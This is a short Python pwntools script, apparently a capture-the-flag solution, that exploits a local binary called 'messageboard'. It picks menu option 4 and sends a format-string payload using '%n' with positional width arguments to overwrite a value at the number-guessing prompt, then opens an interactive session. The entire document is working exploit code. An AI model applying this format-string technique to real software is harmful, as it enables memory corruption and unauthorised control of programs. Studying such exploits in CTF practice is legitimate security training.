#!/usr/bin/env python
from pwn import *
p = process('./messageboard')
p.recvuntil('choice >>')
p.sendline('4')
p.recvuntil('guess a number:')
payload = '%2$*11$s%2$*12$s%13$n'
p.sendline(payload)
p.interactive()
